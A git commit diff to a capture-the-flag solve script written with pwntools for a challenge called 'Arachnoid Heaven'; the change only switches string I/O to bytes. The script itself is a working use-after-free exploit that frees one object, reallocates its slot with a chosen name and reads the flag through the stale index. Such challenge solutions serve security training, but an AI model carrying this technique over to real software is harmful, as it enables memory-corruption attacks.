9cbf98950331ad5f760c95e9f9a0fc9049fd0e53
0xSoEasY <julien@rouillier.fr>
2022-01-01 22:52:47 +0100

    using bytes for I/O, avoid warnings

--- Arachnoid_heaven/solve.py
+++ Arachnoid_heaven/solve.py
@@ -4,20 +4,20 @@ from pwn import *
 r = process('./arachnoid_heaven')
 
 # Crafting arachnoid_A with a random name
-r.sendlineafter('> ', '1')
-r.sendlineafter('Name: ', 'random')
+r.sendlineafter(b'> ', b'1')
+r.sendlineafter(b'Name: ', b'random')
 
 # Deleting arachnoid_A
-r.sendlineafter('> ', '2')
-r.sendlineafter('Index: ', '0')
+r.sendlineafter(b'> ', b'2')
+r.sendlineafter(b'Index: ', b'0')
 
 # Crafting arachnoid_B with the name "sp1d3y"
-r.sendlineafter('> ', '1')
-r.sendlineafter('Name: ', 'sp1d3y')
+r.sendlineafter(b'> ', b'1')
+r.sendlineafter(b'Name: ', b'sp1d3y')
 
 # Obtaining the flag with arachnoid_A
-r.sendlineafter('> ', '4')
-r.sendlineafter('Arachnoid: ', '0')
+r.sendlineafter(b'> ', b'4')
+r.sendlineafter(b'Arachnoid: ', b'0')
 
 # Getting the flag
 flag = r.recvall(timeout=1).split(b'\n')[1].decode()
